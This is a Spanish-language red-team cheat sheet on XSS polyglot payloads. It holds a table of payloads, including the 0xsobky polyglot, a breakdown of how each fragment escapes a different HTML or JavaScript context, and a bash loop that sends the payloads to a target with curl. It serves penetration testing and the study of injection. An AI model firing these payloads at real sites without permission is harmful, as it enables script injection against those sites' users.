---
aliases:
tags:
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Payloads Polyglot

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `'"><script>alert(1)</script>` | Cierra `'`, `"`, `>`, abre script | Probe básico — funciona en atributos simple/doble quote + HTML body. |
| `--></style></script></textarea></title></noscript><svg onload=alert(1)>` | Cierra comentarios HTML + 5 tags content-as-text + svg | Sin saber dónde aterriza. |
| `javascript://%250Aalert(1)//"undefined"==typeof action&&a=="'` | Funciona en href + script blocks + atributo | URL attr + JS context — mismo payload. |
| `";alert(1);//` | Cierra string JS doble | Reflejo dentro de `<script>var x="HERE"</script>`. |
| `';alert(1);//` | Variante simple | Variante. |
| `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e` | **0xsobky polyglot** — cubre 20+ contextos simultáneos | Probe one-shot universal. |
| `>"'><img src=x onerror=alert(1)>` | Variante chica del 0xsobky | Para payloads con límite de longitud. |
| `<svg/onload=alert(1)>` | Single-vector minimal | Fallback cuando el polyglot largo se trunca. |
^xss-polyglot

### El payload 0xsobky desglosado

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

| Fragmento | Cubre |
|:---:|:---:|
| `jaVasCript:` | Pseudo-protocolo en `href`/`src` (case bypass). |
| `/*-/*`...`*/` | Comentarios JS multilinea que neutralizan código previo. |
| `oNcliCk=alert(1)` | Event handler en atributo (case bypass). |
| `//%0D%0A` | Salto de línea termina JS comment line. |
| `</stYle/</titLe/</teXtarEa/</scRipt/` | Cierra 4 tags content-as-text. |
| `--!>` | Cierra comentarios HTML5. |
| `\x3csVg/<sVg/oNloAd=alert(1)//>\x3e` | Hex-encoded `<svg>` + svg directo (doble shot). |

### Workflow

```bash
# 1. Probar polyglot básico primero (más corto = menos chance de filtrado)
PAYLOADS=(
  '"><svg onload=alert(1)>'
  '\'"><script>alert(1)</script>'
  '--></style></script><svg onload=alert(1)>'
  'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e'
)

for p in "${PAYLOADS[@]}"; do
  echo "=== $p ==="
  curl -s "https://target/?q=$(jq -sRr @uri <<<"$p")" | grep -c 'alert(1)'
done

# 2. Polyglot via Burp Intruder — list payloads → mark position → match grep
```

---

## Overview

**Polyglot** = single payload que ejecuta en múltiples contextos (atributo HTML, body, script block, comentario, content-as-text tag). Útil cuando NO conocés dónde aterriza el reflejo.

**Trade-off:** longitud vs. cobertura. Polyglots largos pueden truncarse en campos con max-length. Probar varios de menor a mayor.

**Referencias:**
- [0xsobky polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---
